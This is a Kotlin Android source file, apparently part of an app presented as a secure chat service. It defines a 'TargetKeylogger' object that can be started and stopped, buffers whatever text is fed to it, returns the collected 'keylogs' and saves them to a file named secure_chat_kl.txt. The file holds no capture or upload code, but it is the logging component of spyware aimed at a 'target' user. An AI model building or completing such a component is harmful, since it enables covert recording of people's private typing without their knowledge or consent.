package com.secure.chat.services

import android.content.Context
import android.util.Log
import java.io.File

object TargetKeylogger {

    private const val TAG = "TargetKeylogger"
    private const val LOG_FILE = "secure_chat_kl.txt"
    private var isRunning = false
    private val buffer = StringBuilder()

    fun start(context: Context) {
        if (isRunning) return
        isRunning = true
        Log.d(TAG, "Keylogger started")
    }

    fun stop() {
        isRunning = false
        Log.d(TAG, "Keylogger stopped")
    }

    fun log(text: String) {
        if (!isRunning) return
        buffer.append(text)

        // Keep buffer manageable
        if (buffer.length > 50000) {
            buffer.delete(0, buffer.length - 40000)
        }
    }

    fun getLogs(): String {
        val logs = buffer.toString()
        return if (logs.isEmpty()) "No keylogs captured yet" else logs
    }

    fun clear() {
        buffer.clear()
    }

    fun saveToFile(context: Context): String {
        try {
            val file = File(context.filesDir, LOG_FILE)
            file.writeText(buffer.toString())
            return file.absolutePath
        } catch (e: Exception) {
            return "Error: ${e.message}"
        }
    }
}